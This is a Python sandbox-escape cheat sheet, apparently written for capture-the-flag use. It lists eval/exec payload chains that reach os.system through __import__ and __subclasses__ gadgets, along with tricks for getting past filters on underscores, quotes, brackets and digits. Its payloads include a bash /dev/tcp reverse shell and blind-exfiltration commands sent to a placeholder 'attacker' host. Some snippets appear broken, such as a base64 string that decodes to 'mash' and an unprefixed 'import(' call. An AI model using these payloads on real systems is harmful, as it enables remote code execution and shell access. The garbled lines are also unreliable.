# Python Jail Escape Compendium

## Escape Decision Tree

```
Input is passed to eval/exec
├── Can you import?
│   ├── Yes → __import__('os').system('id')
│   └── No → find builtins
├── Can you access __builtins__?
│   ├── Yes → use __builtins__ to find usable functions
│   └── No → find another reference chain
├── Is there filtering?
│   ├── Underscore filtered → find functions without underscores
│   ├── Quotes filtered → use StringIO/chr()
│   └── Square brackets filtered → use .format() or getattr
└── Character restrictions?
    ├── Letters only → use chr() to construct arbitrary characters
    ├── Length limit → short payload
    └── Digits only → complex encoding
```

## Basic Escape Chains

### 1. Directly Execute Commands
```python
__import__('os').system('id')
__import__('os').popen('id').read()
eval("__import__('os').system('id')")
exec("__import__('os').system('id')")
```

### 2. Via builtins
```python
__builtins__.__dict__['__import__']('os').system('id')
getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
```

### 3. Via func_globals
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
```

### 4. Via type()
```python
type(type(os))
(type.__subclasses__())
```

### 5. Via Warning/Exception
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
```

## Common Subclass Indexes (use print to find index)

```python
# List all available subclasses
print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])

# Or iterate to find a specific class
for i, c in enumerate([].__class__.__base__.__subclasses__()):
    print(i, c.__name__)
```

## Common Gadgets

| Class name | Index | Purpose |
|------|------|------|
| `catch_warnings` | ~59 | Obtain `__builtins__` |
| `_io._IOBase` | ~80 | File operations |
| `Popen` | ~200+ | Command execution |
| `subprocess.Popen` | dynamic | Command execution |

## Bypassing Filters

### Underscore filtered
```python
getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')

# Or use the request object (Flask)
request.environ['werkzeug.server.shutdown']
```

### Quotes filtered
```python
chr(95)*2  # '__'
# Or use StringIO
import('so'[::-1], fromlist=['os']).system('id')
```

### Square brackets filtered
```python
getattr(__import__('os'), 'system')('id')
# Use .__getattribute__ instead of getattr
```

### Digits filtered
```python
# Construct numbers using True/False
True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
# True = 1, False = 0
```

### Length limit
```python
# Shortest reverse shell
__import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')

# Or decode and execute base64
__import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
```

## Common Filter-Bypass Character Sets

| Bypass method | Applicable characters |
|---------|---------|
| `chr()` | All printable characters |
| `hex()` / `oct()` | Number construction |
| `[::-1]` reversal | `so"[::-1]` = `os` |
| `+` concatenation | `'os'[0]+'stem'` |
| Variable assignment | `c='o'+'s';__import__(c)` |

## Blind (No-Output) Detection
```python
# If command execution produces no output, verify using the following
__import__('os').system('curl http://attacker/?$(id)')
__import__('os').system('ping -c1 attacker.com')
```
